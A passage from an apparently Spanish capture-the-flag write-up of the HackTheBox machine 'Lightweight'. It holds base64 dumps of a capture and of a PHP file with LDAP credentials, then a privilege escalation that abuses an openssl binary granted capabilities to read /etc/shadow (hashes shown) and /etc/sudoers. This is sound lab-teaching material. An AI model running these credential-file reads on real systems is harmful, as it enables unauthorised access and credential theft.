CyRb44MHAFYAAABWAAAAAAAAAAAAAAAAAAAAht1gAAAAACAGQP6AAAAAAAAAeQocmj1h3kT+gAAA
AAAAAHkKHJo9Yd5E1KQBhTLp7cVHxJUlgBECq1+9AAABAQgKAUY1kwFGNZN4CyRbDokHAFYAAABW
AAAAAAAAAAAAAAAAAAAAht1gAAAAACAGQP6AAAAAAAAAeQocmj1h3kT+gAAAAAAAAHkKHJo9Yd5E
1KQBhTLp7cVHxJUlgBECq1+9AAABAQgKAUY1nQFGNZN4CyRbHokHAGIAAABiAAAAAAAAAAAAAAAA
AAAAht1gAAAAACwGQP6AAAAAAAAAeQocmj1h3kT+gAAAAAAAAHkKHJo9Yd5EAYXUpEfElSUy6e3G
sBACq1/JAAABAQgKAUY1nQFGNZMBAQUKMuntxTLp7cZ4CyRboZAHAFYAAABWAAAAAAAAAAAAAAAA
AAAAht1gAAAAACAGQP6AAAAAAAAAeQocmj1h3kT+gAAAAAAAAHkKHJo9Yd5EAYXUpEfElSUy6e3G
gBECq1+9AAABAQgKAUY1nQFGNZN4CyRbxpAHAFYAAABWAAAAAAAAAAAAAAAAAAAAht1gAAAAACAG
QP6AAAAAAAAAeQocmj1h3kT+gAAAAAAAAHkKHJo9Yd5E1KQBhTLp7cZHxJUmgBACq1+9AAABAQgK
AUY1nQFGNZ1+CyRblt4LAF4AAABeAAAAAAAAAAAAAAAAAAAAht1gAAAAACgGQP6AAAAAAAAAeQoc
mj1h3kT+gAAAAAAAAHkKHJo9Yd5E1KYBhVui0kwAAAAAoAKqql/FAAACBP/EBAIICgFGTiUAAAAA
AQMDBn4LJFv43gsAXgAAAF4AAAAAAAAAAAAAAAAAAACG3WAAAAAAKAZA/oAAAAAAAAB5ChyaPWHe
RP6AAAAAAAAAeQocmj1h3kQBhdSmH6vna1ui0k2gEqqqX8UAAAIE/8QEAggKAUZOKQFGTiUBAwMG
fgskW37fCwBWAAAAVgAAAAAAAAAAAAAAAAAAAIbdYAAAAAAgBkD+gAAAAAAAAHkKHJo9Yd5E/oAA
AAAAAAB5ChyaPWHeRNSmAYVbotJNH6vnbIAQAqtfvQAAAQEICgFGTikBRk4pfgskWx4XDAB1AAAA
dQAAAAAAAAAAAAAAAAAAAIbdYAAAAAA/BkD+gAAAAAAAAHkKHJo9Yd5E/oAAAAAAAAB5ChyaPWHe
RNSmAYVbotJNH6vnbIAYAqtf3AAAAQEICgFGTjcBRk4pMB0CAQF3GIAWMS4zLjYuMS40LjEuMTQ2
Ni4yMDAzN34LJFtkFwwAVgAAAFYAAAAAAAAAAAAAAAAAAACG3WAAAAAAIAZA/oAAAAAAAAB5Chya
PWHeRP6AAAAAAAAAeQocmj1h3kQBhdSmH6vnbFui0myAEAKrX70AAAEBCAoBRk43AUZON34LJFuA
GQwAZAAAAGQAAAAAAAAAAAAAAAAAAACG3WAAAAAALgZA/oAAAAAAAAB5ChyaPWHeRP6AAAAAAAAA
eQocmj1h3kQBhdSmH6vnbFui0myAGAKrX8sAAAEBCAoBRk43AUZONzAMAgEBeAcKAQAEAAQAfgsk
W5gZDABWAAAAVgAAAAAAAAAAAAAAAAAAAIbdYAAAAAAgBkD+gAAAAAAAAHkKHJo9Yd5E/oAAAAAA
AAB5ChyaPWHeRNSmAYVbotJsH6vneoAQAqtfvQAAAQEICgFGTjcBRk43fwskW/JYBQB3AQAAdwEA
AAAAAAAAAAAAAAAAAIbdYAAAAAFBBkD+gAAAAAAAAHkKHJo9Yd5E/oAAAAAAAAB5ChyaPWHeRNSm
AYVbotJsH6vneoAYAqtg3gAAAQEICgFGUF4BRk43FgMBARwBAAEYAwPRtfycQx1nI+UQhq/CrH5D
Oj9cP66yt/FW5kVB1gNKSwAArMAwwCzAKMAkwBTACgClAKMAoQCfAGsAagBpAGgAOQA4ADcANgCI
AIcAhgCFwDLALsAqwCbAD8AFAJ0APQA1AITAL8ArwCfAI8ATwAkApACiAKAAngBnAEAAPwA+ADMA
MgAxADAAmgCZAJgAlwBFAEQAQwBCwDHALcApwCXADsAEAJwAPAAvAJYAQcASwAgAFgATABAADcAN
wAMACgAHwBHAB8AMwAIABQAEAP8BAABDAAsABAMAAQIACgAKAAgAFwAZABgAFgAjAAAADQAgAB4G
AQYCBgMFAQUCBQMEAQQCBAMDAQMCAwMCAQICAgMADwABAX8LJFtPYwUAnwIAAJ8CAAAAAAAAAAAA
AAAAAACG3WAAAAACaQZA/oAAAAAAAAB5ChyaPWHeRP6AAAAAAAAAeQocmj1h3kQBhdSmH6vnelui
042AGAK8YgYAAAEBCAoBRlBnAUZQXhYDAwA6AgAANgMDA4Ue6Hc4V/47bFSDszjdwdnP9zrwRyKM
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
RP6AAAAAAAAAeQocmj1h3kQBhdSqYCaivKt08tSgEqqqX8UAAAIE/8QEAggKAUZvqQFGb6kBAwMG
hwskW1lpBQBWAAAAVgAAAAAAAAAAAAAAAAAAAIbdYAAAAAAgBkD+gAAAAAAAAHkKHJo9Yd5E/oAA
AAAAAAB5ChyaPWHeRNSqAYWrdPLUYCaivYAQAqtfvQAAAQEICgFGb6kBRm+phwskWxOaBQB1AAAA
dQAAAAAAAAAAAAAAAAAAAIbdYAAAAAA/BkD+gAAAAAAAAHkKHJo9Yd5E/oAAAAAAAAB5ChyaPWHe
RNSqAYWrdPLUYCaivYAYAqtf3AAAAQEICgFGb7MBRm+pMB0CAQF3GIAWMS4zLjYuMS40LjEuMTQ2
Ni4yMDAzN4cLJFtVmgUAVgAAAFYAAAAAAAAAAAAAAAAAAACG3WAAAAAAIAZA/oAAAAAAAAB5Chya
PWHeRP6AAAAAAAAAeQocmj1h3kQBhdSqYCaivat08vOAEAKrX70AAAEBCAoBRm+zAUZvs4cLJFtJ
nQUAZAAAAGQAAAAAAAAAAAAAAAAAAACG3WAAAAAALgZA/oAAAAAAAAB5ChyaPWHeRP6AAAAAAAAA
eQocmj1h3kQBhdSqYCaivat08vOAGAKrX8sAAAEBCAoBRm+3AUZvszAMAgEBeAcKAQAEAAQAhwsk
W1adBQBWAAAAVgAAAAAAAAAAAAAAAAAAAIbdYAAAAAAgBkD+gAAAAAAAAHkKHJo9Yd5E/oAAAAAA
AAB5ChyaPWHeRNSqAYWrdPLzYCaiy4AQAqtfvQAAAQEICgFGb7cBRm+3hwskW0+xBQB3AQAAdwEA
AAAAAAAAAAAAAAAAAIbdYAAAAAFBBkD+gAAAAAAAAHkKHJo9Yd5E/oAAAAAAAAB5ChyaPWHeRNSq
AYWrdPLzYCaiy4AYAqtg3gAAAQEICgFGb7cBRm+3FgMBARwBAAEYAwOtp7DwIjt5DIftpbauidHj
CQyVnTtm/wKLhIpj89h4ZgAArMAwwCzAKMAkwBTACgClAKMAoQCfAGsAagBpAGgAOQA4ADcANgCI
AIcAhgCFwDLALsAqwCbAD8AFAJ0APQA1AITAL8ArwCfAI8ATwAkApACiAKAAngBnAEAAPwA+ADMA
MgAxADAAmgCZAJgAlwBFAEQAQwBCwDHALcApwCXADsAEAJwAPAAvAJYAQcASwAgAFgATABAADcAN
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
PWHeRNSqAYWrdPWOAAAAAFAEAABfsQAA
[ldapuser1@lightweight ~]$ base64 ldapTLS.php
PD9waHAKJHVzZXJuYW1lID0gJ2xkYXB1c2VyMSc7CiRwYXNzd29yZCA9ICdmM2NhOWQyOThhNTUz
ZGExMTc0NDJkZWViNmZhOTMyZCc7CgovLyBUaGlzIGNvZGUgdXNlcyB0aGUgU1RBUlRfVExTIGNv
bW1hbmQKCiRsZGFwaG9zdCA9ICJsZGFwOi8vbGlnaHR3ZWlnaHQuaHRiIjsKJGxkYXBVc2VybmFt
ZSAgPSAiY249JHVzZXJuYW1lIjsKCiRkcyA9IGxkYXBfY29ubmVjdCgkbGRhcGhvc3QpOwokZG4g
PSAidWlkPWxkYXB1c2VyMSxvdT1QZW9wbGUsZGM9bGlnaHR3ZWlnaHQsZGM9aHRiIjsgCgppZigh
bGRhcF9zZXRfb3B0aW9uKCRkcywgTERBUF9PUFRfUFJPVE9DT0xfVkVSU0lPTiwgMykpewogICAg
cHJpbnQgIkNvdWxkIG5vdCBzZXQgTERBUHYzXHJcbiI7Cn0KZWxzZSBpZiAoIWxkYXBfc3RhcnRf
dGxzKCRkcykpIHsKICAgIHByaW50ICJDb3VsZCBub3Qgc3RhcnQgc2VjdXJlIFRMUyBjb25uZWN0
aW9uIjsKfQplbHNlCiB7Ci8vIG5vdyB3ZSBuZWVkIHRvIGJpbmQgdG8gdGhlIGxkYXAgc2VydmVy
CiRidGggPSBsZGFwX2JpbmQoJGRzLCAkZG4sICRwYXNzd29yZCkgb3IgZGllKCJcclxuQ291bGQg
bm90IGNvbm5lY3QgdG8gTERBUCBzZXJ2ZXJcclxuIik7CgplY2hvICJUTFMgY29ubmVjdGlvbiBl
c3RhYmxpc2hlZC4iOwp9Cj8+Cg==
```

Cuando estuve buscando si mi usuario podía usar tcpdump, me encontré con un tema de getcap interesante, por lo que después cuando `linenum` me dio algunos resultados enseguida lo ejecute de manera recurrente:

```text
[ldapuser1@lightweight /]$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/openssl =ep
[ldapuser1@lightweight /]$
```

Si prestamos atención y replicamos con LinEnum tenemos:

```text
[+] Files with POSIX capabilities set:
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/openssl =ep
```

Tenemos en nuestro home 2 programas (que ya era raro tenerlos ahí) que tienen privilegios vía **capabilities** del kernel. Un par de _googleadas_ después de buscar _privesc capabilities_ encontraremos el siguiente enlace:

https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux

Ahí encontraremos que usando openssl con capabilities de EP (like root), podemos leer y editar cualquier archivo. Así que manos a la obra:

```text
[ldapuser1@lightweight ~]$ mkdir /dev/shm/miau
[ldapuser1@lightweight ~]$ openssl req -x509 -newkey rsa:2048 -keyout /dev/shm/miau/key.pem -out /dev/shm/miau/cert.pem -days 365 -nodes
Generating a 2048 bit RSA private key
...+++
...................................+++
writing new private key to '/dev/shm/miau/key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]:
State or Province Name (full name) []:
Locality Name (eg, city) [Default City]:
Organization Name (eg, company) [Default Company Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (eg, your name or your server's hostname) []:
Email Address []:
```

Certificado listo, ahora toca levantar el servicio de https en un puerto _elite_:

```text
[ldapuser1@lightweight /]$ /home/ldapuser1/openssl s_server -key /dev/shm/miau/key.pem -cert /dev/shm/miau/cert.pem -port 1337 -HTTP &
[2] 15110
[ldapuser1@lightweight /]$ Using default temp DH parameters
ACCEPT
```

Servicio HTTPS listo. Recordemos que el home desde donde se ejecuta este servicio es raíz (/). Probemos con /etc/shadow como dice el articulo:

```text
[ldapuser1@lightweight /]$ curl -k https://127.0.0.1:1337/etc/shadow
FILE:etc/shadow
ACCEPT
root:$6$saltsalt$YTeBOLnmm3CoeJTzBuijUEtOEWCqrw/nQ8/AeMmON4LGp3k0ZiMjC1OdqzWFUAfDQBvYkOch9BWtQTBcZ1E/p0:17632:0:99999:7:::
bin:*:17632:0:99999:7:::
daemon:*:17632:0:99999:7:::
adm:*:17632:0:99999:7:::
lp:*:17632:0:99999:7:::
sync:*:17632:0:99999:7:::
shutdown:*:17632:0:99999:7:::
halt:*:17632:0:99999:7:::
mail:*:17632:0:99999:7:::
operator:*:17632:0:99999:7:::
games:*:17632:0:99999:7:::
ftp:*:17632:0:99999:7:::
nobody:*:17632:0:99999:7:::
systemd-network:!!:17689::::::
dbus:!!:17689::::::
polkitd:!!:17689::::::
apache:!!:17689::::::
libstoragemgmt:!!:17689::::::
abrt:!!:17689::::::
rpc:!!:17689:0:99999:7:::
sshd:!!:17689::::::
postfix:!!:17689::::::
ntp:!!:17689::::::
chrony:!!:17689::::::
tcpdump:!!:17689::::::
ldap:!!:17691::::::
saslauth:!!:17691::::::
ldapuser1:$6$OZfv1n9v$2gh4EFIrLW5hZEEzrVn4i8bYfXMyiPp2450odPwiL5yGOHYksVd8dCTqeDt3ffgmwmRYw49cMFueNZNOoI6A1.:17691:365:99999:7:::
ldapuser2:$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1:17691:365:99999:7:::
10.10.14.92:yqo8Lgn5JIG1.:17995:0:99999:7:::
10.10.14.151:jvxpWniFejFvo:17995:0:99999:7:::
10.10.15.237:aryD9l9x6HgzY:17995:0:99999:7:::
10.10.16.6:kt.cdFWM6eItg:17995:0:99999:7:::
10.10.12.29:gm9Gtwv3a9Em6:17995:0:99999:7:::
10.10.14.23:xqOXmUUIG5iTA:17995:0:99999:7:::
10.10.10.119:fx2PVX7tUaSIc:17995:0:99999:7:::
127.0.0.1:bafhU6gpsxGdY:17995:0:99999:7:::
```

Great. Ahora, si en lugar de levantar el servicio usamos el encoder de openssl?

```text
[ldapuser1@lightweight ~]$ ./openssl enc -in /etc/sudoers | grep -vE '^#|^$'
Defaults   !visiblepw
Defaults    always_set_home
Defaults    match_group_by_gid
Defaults    env_reset
Defaults    env_keep =  "COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS"
Defaults    env_keep += "MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"
